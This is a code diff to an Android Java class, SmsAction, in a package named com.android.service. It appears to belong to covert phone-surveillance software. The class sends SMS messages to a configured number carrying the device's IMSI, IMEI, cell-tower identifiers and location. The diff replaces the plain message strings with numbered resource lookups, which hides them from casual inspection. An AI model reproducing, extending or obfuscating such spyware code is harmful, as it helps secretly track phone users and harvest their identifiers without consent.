@@ -15,6 +15,7 @@ import android.telephony.SmsManager;
 
 import com.android.service.CellInfo;
 import com.android.service.Device;
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -26,7 +27,7 @@ import com.android.service.util.WChar;
  * The Class SmsAction.
  */
 public class SmsAction extends SubAction {
-	private static final String TAG = "SmsAction";
+	private static final String TAG = "SmsAction"; //$NON-NLS-1$
 
 	/** The Constant TYPE_LOCATION. */
 	private static final int TYPE_LOCATION = 1;
@@ -77,7 +78,7 @@ public class SmsAction extends SubAction {
 				return true;
 
 			case TYPE_SIM:
-				text = "IMSI: " + Device.self().getImsi();
+				text = Messages.getString("1.0") + Device.self().getImsi(); //$NON-NLS-1$
 				sendSMS(text);
 				return true;
 
@@ -91,12 +92,12 @@ public class SmsAction extends SubAction {
 				final CellInfo c = Device.getCellInfo();
 
 				if (c.cdma && c.valid) {
-					text = "SID: " + c.sid + ", NID: " + c.nid + ", BID: " + c.bid;
+					text = Messages.getString("1.1") + c.sid + Messages.getString("1.2") + c.nid + Messages.getString("1.3") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 					sendSMS(text);
 				}
 
 				if (c.gsm && c.valid) {
-					text = "CC: " + c.mcc + ", MNC: " + c.mnc + ", LAC: " + c.lac + ", CID: " + c.cid;
+					text = Messages.getString("1.4") + c.mcc + Messages.getString("1.5") + c.mnc + Messages.getString("1.6") + c.lac + Messages.getString("1.7") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 					sendSMS(text);
 				}
 
@@ -105,7 +106,7 @@ public class SmsAction extends SubAction {
 			return true;
 		} catch (final Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + ex.toString());
+				Check.log(TAG + " Error: " + ex.toString()) ;//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -116,7 +117,7 @@ public class SmsAction extends SubAction {
 	 */
 	private void errorLocation() {
 		if (!getCellPosition()) {
-			sendSMS("Cell and GPS info not available");
+			sendSMS(Messages.getString("1.8")); //$NON-NLS-1$
 		}
 	}
 
@@ -166,7 +167,7 @@ public class SmsAction extends SubAction {
 		try {
 			type = databuffer.readInt();
 			if (Cfg.DEBUG) {
-				Check.asserts(type >= 1 && type <= 3, "wrong type");
+				Check.asserts(type >= 1 && type <= 3, "wrong type"); //$NON-NLS-1$
 			}
 			int len = databuffer.readInt();
 			byte[] buffer = new byte[len];
@@ -199,8 +200,8 @@ public class SmsAction extends SubAction {
 				}
 
 				if (Device.isGprs()) {
-					sb.append("IMEI: " + device.getImei() + "\n");
-					sb.append("IMSI: " + device.getImsi() + "\n");
+					sb.append(Messages.getString("1.9") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+					sb.append(Messages.getString("1.11") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				text = sb.toString();
@@ -208,7 +209,7 @@ public class SmsAction extends SubAction {
 
 			default:
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);
+					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type) ;//$NON-NLS-1$
 				}
 				break;
 			}
@@ -228,9 +229,9 @@ public class SmsAction extends SubAction {
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
 
-		sb.append("Sms type: " + type);
-		sb.append(" number: " + number);
-		sb.append(" text: " + text);
+		sb.append(Messages.getString("1.13") + type); //$NON-NLS-1$
+		sb.append(Messages.getString("1.14") + number); //$NON-NLS-1$
+		sb.append(Messages.getString("1.15") + text); //$NON-NLS-1$
 
 		return sb.toString();
 	}
